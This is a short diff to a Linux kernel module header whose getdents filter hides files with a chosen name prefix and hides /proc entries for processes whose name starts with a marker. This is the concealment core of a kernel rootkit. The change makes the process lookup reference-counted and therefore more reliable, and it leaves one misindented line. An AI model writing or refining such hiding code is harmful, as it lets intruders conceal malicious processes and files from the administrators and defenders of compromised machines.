@@ -2,7 +2,7 @@
 #define GETDENTS_H_
 
 #include <linux/dirent.h>
-
+#include <linux/pid.h>
 /* 3.10 headers do not export struct linux_dirent (private to fs/readdir.c) */
 struct linux_dirent {
     unsigned long  d_ino;
@@ -74,15 +74,19 @@ static long filter_dirents(void __user *udirent, long ret, bool is64)
 
         if (strncmp(name, PREFIX, strlen(PREFIX)) == 0) {
             hide = true;                        /* rule 1: name prefix */
-        } else if (is_numeric(name)) {          /* rule 2: /proc/<pid> */
+                } else if (is_numeric(name)) {          /* rule 2: /proc/<pid> */
             int pid;
             if (kstrtoint(name, 10, &pid) == 0) {
-                struct task_struct *t;
-                rcu_read_lock();
-                t = find_task_by_vpid(pid);
-                if (t && strncmp(t->comm, MARKER, strlen(MARKER)) == 0)
-                    hide = true;
-                rcu_read_unlock();
+                struct pid *p = find_get_pid(pid);
+                if (p) {
+                    struct task_struct *t = get_pid_task(p, PIDTYPE_PID);
+                    if (t) {
+                        if (strncmp(t->comm, MARKER, strlen(MARKER)) == 0)
+                            hide = true;
+                        put_task_struct(t);
+                    }
+                    put_pid(p);
+                }
             }
         }
 
